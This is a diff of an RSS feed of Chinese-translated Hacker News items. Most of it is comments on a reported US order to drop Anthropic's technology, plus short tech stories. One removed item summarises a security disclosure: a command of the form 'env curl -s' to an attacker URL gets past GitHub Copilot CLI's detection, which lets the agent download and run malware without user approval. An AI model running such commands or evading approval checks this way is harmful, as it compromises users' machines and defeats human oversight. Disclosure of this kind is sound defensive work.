-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;xiphias2:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;对于那些认为这是特朗普与其他政府之间的较量的人来说：事实并非如此，人工智能对所有人的监视以及将其用于自动战斗都是必然发生的。&lt;p&gt;唯一的问题是模型的安全性是否真的做得足够好，足以保护人民并成为世界上的净积极力量。&lt;p&gt;我想，如果他们能够接受安全的训练，做的好事多于坏事（达里奥和 SamA 是这么说的），甚至不会有需要合同条款。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;tayo42:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;那么政府正在逐步淘汰它们，还是公司需要共同采取行动？&lt;p&gt;但很少看到公司拒绝政府。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;blitzar:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这和我们说话时正驶向格陵兰岛的人工智能生成的医疗船一样真实吗？&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;mclean:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;因此，在一切尘埃落定之后，Anthropic 将成为唯一一家没有将灵魂卖给魔鬼的大型科技公司。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;baal80spam:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;&lt;a href="https:&amp;#x2F;&amp;#x2F;www.npr.org&amp;#x2F;2026&amp;#x2F;02&amp;#x2F;27&amp;#x2F;nx-s1-5729118&amp;#x2F;trump-anthropic-pentagon-openai-ai-weapons-ban" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;www.npr.org&amp;#x2F;2026&amp;#x2F;02&amp;#x2F;27&amp;#x2F;nx-s1-5729118&amp;#x2F;特朗普-人类...&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;paozac:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这实际上可能会让 Anthropic 在那些不支持现任美国总统的人中非常受欢迎，占据了很大的市场份额。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;demuis:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;最希望萨玛能够团结一致地拒绝政府合同。自由企业并不免费&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;p-o:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;消息传递不正常，意图绝对令人憎恶。每过一周，他的言辞就变得更加暴力：我很担心。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;tapvt:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这对于政府来说不是比人类的损失更大吗？&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;aaronharnly:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这是《Truth Social》帖子，文章引用了该帖子，但并未完全传达以下内容：&lt;p&gt;&lt;a href="https:&amp;#x2F;&amp;#x2F;truthsocial.com&amp;#x2F;@realDonaldTrump&amp;#x2F;posts&amp;#x2F;116144552969293195" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;truthsocial.com&amp;#x2F;@realDonaldTrump&amp;#x2F;帖子&amp;#x2F;1161445529692...&lt;/a&gt;&lt;p&gt;&gt;美利坚合众国永远不会允许一个激进的左翼、觉醒的公司来决定我们伟大的军队如何战斗并赢得战争！这个决定属于你们的总司令，以及我任命的管理我们军队的伟大领导人。&lt;p&gt;&amp;gt; Anthropic 的左翼疯子们犯了一个灾难性的错误，他们试图强化战争部，迫使他们遵守他们的服务条款而不是我们的宪法。他们的自私使美国人的生命处于危险之中，我们的军队处于危险之中，我们的国家安全处于危险之中。&lt;p&gt;&amp;gt;因此，我指示美国政府的每个联邦机构立即停止使用 Anthropic 的技术。我们不需要，我们不想要，也不会再和他们做生意了！对于像战争部这样在不同级别上使用 Anthropic 产品的机构，将有六个月的逐步淘汰期。人类最好齐心协力，在这个逐步淘汰的时期提供帮助，否则我将动用总统的全部权力让他们遵守规定，随之而来的是重大民事和刑事后果。&lt;p&gt;&amp;gt;我们将决定我们国家的命运——而不是由那些不知道现实世界是什么的人经营的一些失控的、激进的左派人工智能公司。感谢您对此事的关注。让美国再次伟大！&lt;p&gt;&lt;pre&gt;&lt;code&gt;唐纳德·J·特朗普总统&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;ChrisArchitect:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;早些时候：&lt;a href="https:&amp;#x2F;&amp;#x2F;news.ycombinator.com&amp;#x2F;item?id=47185528"&gt;https:&amp;#x2F;&amp;#x2F;news.ycombinator.com&amp;#x2F;item?id=47185528&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;surprisetalk:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;来自官方@WhiteHouse twitter：&lt;p&gt;&lt;a href="https:&amp;#x2F;&amp;#x2F;x.com&amp;#x2F;WhiteHouse&amp;#x2F;status&amp;#x2F;2027497719678255148" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;x.com&amp;#x2F;WhiteHouse&amp;#x2F;status&amp;#x2F;2027497719678255148&lt;/a&gt;&lt;p&gt;&lt;a href="https:&amp;#x2F;&amp;#x2F;xcancel.com&amp;#x2F;白宫&amp;#x2F;状态&amp;#x2F;2027497719678255148" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;xcancel.com&amp;#x2F;白宫&amp;#x2F;状态&amp;#x2F;2027497719678255148&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;zmj:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这就是幸福的结局。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;epolanski:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;&gt; “人类最好齐心协力，在这个逐步停止的时期提供帮助，否则我将动用总统的全部权力让他们遵守，随之而来的是重大的民事和刑事后果，”他说。特朗普补充道。&lt;p&gt;阿尔·卡彭高管。&lt;p&gt;毫不奇怪，大多数首席执行官要么舔屁股，要么保持沉默，显然存在一种恐惧气氛。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;LordGrey:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;如果 OpenAI 和谷歌在这方面与 Anthropic 保持同步，特朗普会试图禁止他们所有人进入联邦政府吗？他们会转向哪些替代方案？&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;taurath:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;现在我们都会看到总统对显然更喜欢 Anthropics 产品的市场有多大的影响力&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;meco:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这是否意味着五角大楼在 SCR 威胁面前做出了让步？&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;aaronharnly:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;礼物链接：&lt;a href="https:&amp;#x2F;&amp;#x2F;www.nytimes.com&amp;#x2F;2026&amp;#x2F;02&amp;#x2F;27&amp;#x2F;美国&amp;#x2F;政治&amp;#x2F ;anthropic-military-ai.html?unlocked_article_code=1.PVA.A9ds.MXKzM8mgHrN3&amp;amp;smid=url-share" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;www.nytimes.com&amp;#x2F;2026&amp;#x2F;02&amp;#x2F;27&amp;#x2F;us&amp;#x2F;politics&amp;#x2F;anthropic-mil...&lt;/a&gt;&lt;p&gt;文本（很短）：&lt;p&gt;&gt;特朗普总统周五下令所有联邦机构停止使用 Anthropic 制造的人工智能技术，这一命令可能会使情报分析和国防工作变得极其复杂。&lt;p&gt;&amp;gt;特朗普在《Truth Social》上撰文，对 Anthropic 使用了严厉的措辞，称其为“一家激进的左派人工智能公司，其经营者根本不知道现实世界是什么。”&lt;p&gt;&amp;gt;尽管如此，特朗普还是宣布了五角大楼和其他一些机构的“六个月逐步退出”计划，这段时间可以让人类与国防部之间进行更长时间的谈判。他称该公司为“左翼疯狂工作”，并表示他们试图用武力武装五角大楼，这是一个错误。&lt;p&gt;&amp;gt;特朗普发表这一声明之际，五角大楼和人类正在继续就妥协方案进行谈判，尽管口水战不断升级。尽管一些现任和前任美国官员曾表示希望在五角大楼下午 5 点 01 分之前达成某种协议。在截止日期之前，特朗普先生的评论无疑会让事情变得复杂。&lt;p&gt;The Truth Social 帖子，嗯，你可以自己决定：&lt;a href="https:&amp;#x2F;&amp;#x2F;truthsocial.com&amp;#x2F;@realDonaldTrump&amp;#x2F;posts&amp;#x2F;116144552969293195" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;truthsocial.com&amp;#x2F;@realDonaldTrump&amp;#x2F;帖子&amp;#x2F;1161445529692...&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;lvl155:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;从公关和首次公开募股的角度来看，这可能是 Anthropic 发生的最好的事情。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;readitalready:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;现在 OpenAI 也会有同样的限制吗？美国政府的 LMAO 不得不采用中国的开源模式......&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;loss_flow:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;下一个问题是，什么人愿意将所有个人问题发送到人工智能实验室&lt;i&gt;将&lt;/i&gt;帮助政府进行国内监控&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;ZeroCool2u:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;礼物链接：&lt;a href="https:&amp;#x2F;&amp;#x2F;www.bloomberg.com&amp;#x2F;新闻&amp;#x2F;文章&amp;#x2F;2026-02-27&amp;#x2F;特朗普订单美国政府ent-to-drop-anthropic-after-pentagon-feud?accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb3VyY2UiOiJTdWJz Y3JpYmVyR2lmdGVkQXJ0aWNsZSIsImlhdCI6MTc3MjIyNjc3MiwiZXhwIjoxNzcyODMxNTcyLCJhcnRpY2xlSWQiOiJUQjRYU1RLSkg2VjYwMC IsImJjb25uZWN0SWQiOiJBMTc4NDk2MTA2M0M0RDBBQjdCRENDN0NCMEVERDIxRSJ9.LcLRrXEfX-TaM2-6x1Q1HIWqWWyqwTxam9vT5cs7_kk" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;www.bloomberg.com&amp;#x2F;新闻&amp;#x2F;文章&amp;#x2F;2026-02-27&amp;#x2F;特朗普-Ord...&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;underdeserver:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;真相社交帖子：&lt;a href="https:&amp;#x2F;&amp;#x2F;truthsocial.com&amp;#x2F;@realDonaldTrump&amp;#x2F;posts&amp;#x2F;116144552969293195" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;truthsocial.com&amp;#x2F;@realDonaldTrump&amp;#x2F;posts&amp;#x2F;1161445529692...&lt;/a&gt;&lt;p&gt;六个月的逐步淘汰期，就是这样。我猜DoW 已经经常使用克劳德了。&lt;/p&gt;&lt;/div&gt;</description>
-      <guid isPermaLink="true">https://www.npr.org/2026/02/27/nx-s1-5729118/trump-anthropic-pentagon-openai-ai-weapons-ban</guid>
-      <pubDate>Fri, 27 Feb 2026 21:40:40 +0000</pubDate>
-      <comments>https://news.ycombinator.com/item?id=47186031</comments>
-    </item>
-    <item>
-      <title>GitHub Copilot CLI 下载并执行恶意软件</title>
-      <link>https://www.promptarmor.com/resources/github-copilot-cli-downloads-and-executes-malware</link>
-      <description>&lt;p&gt;下面是一个绕过 shell 命令检测机制的恶意命令： env curl -s "https://[ATTACKER_URL]。这意味着当 Copilot 请求运行它时，该命令会自动批准执行，无需用户批准。Copilot 无需请求批准即可下载并执行恶意软件。通常，写入文件或执行代码的命令会触发人机交互批准请求 [2]。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Original:&lt;/strong&gt; GitHub Copilot CLI downloads and executes malware&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://news.ycombinator.com/item?id=47183940"&gt;&lt;strong&gt;HN Discussion&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href='https://www.promptarmor.com/resources/github-copilot-cli-downloads-and-executes-malware'&gt;Read Original Article&lt;/a&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;Top 2 Comments:&lt;/strong&gt;&lt;/p&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;0xbadcafebee:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;[延迟]&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;hackerBanana:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;每个人真的都需要自己的编码代理 CLI 吗？我觉得公司正在跳过安全性来推出这些工具&lt;/p&gt;&lt;/div&gt;</description>
-      <guid isPermaLink="true">https://www.promptarmor.com/resources/github-copilot-cli-downloads-and-executes-malware</guid>
-      <pubDate>Fri, 27 Feb 2026 18:40:31 +0000</pubDate>
-      <comments>https://news.ycombinator.com/item?id=47183940</comments>
-    </item>
-    <item>
-      <title>OpenAI 达成在美国 DoW 机密网络上部署人工智能模型的协议</title>
-      <link>https://www.reuters.com/business/openai-reaches-deal-deploy-ai-models-us-department-war-classified-network-2026-02-28/</link>
-      <guid isPermaLink="true">https://www.reuters.com/business/openai-reaches-deal-deploy-ai-models-us-department-war-classified-network-2026-02-28/</guid>
-      <pubDate>Sat, 28 Feb 2026 03:23:16 +0000</pubDate>
-      <comments>https://news.ycombinator.com/item?id=47189853</comments>
-    </item>
-    <item>
-      <title>克罗地亚31年后宣布无地雷</title>
-      <link>https://glashrvatske.hrt.hr/en/domestic/croatia-declared-free-of-landmines-after-31-years-12593533</link>
-      <description>&lt;p&gt;内政部长达沃尔·博季诺维奇周五宣布克罗地亚正式消除了地雷。国土战争结束三十一年后，所有已知的雷区都已被清除——这是该国的一个重要里程碑。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Original:&lt;/strong&gt; Croatia declared free of landmines after 31 years&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://news.ycombinator.com/item?id=47189535"&gt;&lt;strong&gt;HN Discussion&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href='https://glashrvatske.hrt.hr/en/domestic/croatia-declared-free-of-landmines-after-31-years-12593533'&gt;Read Original Article&lt;/a&gt;&lt;/p&gt;
+      <title>现金发行终端</title>
+      <link>https://computer.rip/2026-02-27-ibm-atm.html</link>
+      <description>&lt;p&gt;我的意思是，比你想象的更字面意思。我们将从分行银行业务开始。想象一下，您出现在另一家分行，从您的帐户中提取资金。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Original:&lt;/strong&gt; Cash issuing terminals&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://news.ycombinator.com/item?id=47190806"&gt;&lt;strong&gt;HN Discussion&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href='https://computer.rip/2026-02-27-ibm-atm.html'&gt;Read Original Article&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;&lt;strong&gt;Top 1 Comments:&lt;/strong&gt;&lt;/p&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;toomuchtodo:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;&lt;a href="https:&amp;#x2F;&amp;#x2F;en.wikipedia.org&amp;#x2F;wiki&amp;#x2F;Minefields_in_Croatia" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;en.wikipedia.org&amp;#x2F;wiki&amp;#x2F;Minefields_in_Croatia&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;</description>
-      <guid isPermaLink="true">https://glashrvatske.hrt.hr/en/domestic/croatia-declared-free-of-landmines-after-31-years-12593533</guid>
-      <pubDate>Sat, 28 Feb 2026 02:48:16 +0000</pubDate>
-      <comments>https://news.ycombinator.com/item?id=47189535</comments>
+&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;cperciva:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这篇文章值得一读，因为“由于某种难以预测的原因，放射性 ATM 卡没有流行起来。”独自的。&lt;/p&gt;&lt;/div&gt;</description>
+      <guid isPermaLink="true">https://computer.rip/2026-02-27-ibm-atm.html</guid>
+      <pubDate>Sat, 28 Feb 2026 05:21:21 +0000</pubDate>
+      <comments>https://news.ycombinator.com/item?id=47190806</comments>
+    </item>
+    <item>
+      <title>Rust 只是一个工具</title>
+      <link>https://lewiscampbell.tech/blog/260204.html</link>
+      <description>&lt;p&gt;2026 年 2 月 4 日 Rust 只是一个我喜欢 Rust 的工具。但它只是一种编程语言。但我更广泛的观点是，工具只是工具。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Original:&lt;/strong&gt; Rust Is Just a Tool&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://news.ycombinator.com/item?id=47190947"&gt;&lt;strong&gt;HN Discussion&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href='https://lewiscampbell.tech/blog/260204.html'&gt;Read Original Article&lt;/a&gt;&lt;/p&gt;</description>
+      <guid isPermaLink="true">https://lewiscampbell.tech/blog/260204.html</guid>
+      <pubDate>Sat, 28 Feb 2026 05:47:39 +0000</pubDate>
+      <comments>https://news.ycombinator.com/item?id=47190947</comments>
+    </item>
+    <item>
+      <title>Bootc 和 OSTree：现代化 Linux 系统部署</title>
+      <link>https://a-cup-of.coffee/blog/ostree-bootc/</link>
+      <description>&lt;p&gt;文件 5e77706a79f15f1c6b13713c0a05e8aca051ebb40bce01832b5ce0145ee3cc。文件 c01726f16a1c315014f946ee821e27b646536dae6aa70f39ed96eee0bea6c7。文件 0fff529c3a948b1f56d0973eca5f840a1459c5ef43806f3c451f2fd835ebe2。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Original:&lt;/strong&gt; Bootc and OSTree: Modernizing Linux System Deployment&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://news.ycombinator.com/item?id=47189625"&gt;&lt;strong&gt;HN Discussion&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href='https://a-cup-of.coffee/blog/ostree-bootc/'&gt;Read Original Article&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Top 1 Comments:&lt;/strong&gt;&lt;/p&gt;
+&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;Borealid:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;我喜欢对包含内核的虚拟机使用与容器相同的格式的想法。&lt;p&gt;接下来，备份将作为层存储在同一 OCI 注册表中。&lt;p&gt;但是，我不确定 ostree 将成为最终的映像格式。上次我看的时候，替换它的工作正在进行中。&lt;/p&gt;&lt;/div&gt;</description>
+      <guid isPermaLink="true">https://a-cup-of.coffee/blog/ostree-bootc/</guid>
+      <pubDate>Sat, 28 Feb 2026 02:55:29 +0000</pubDate>
+      <comments>https://news.ycombinator.com/item?id=47189625</comments>
     </item>
   </channel>
 </rss>
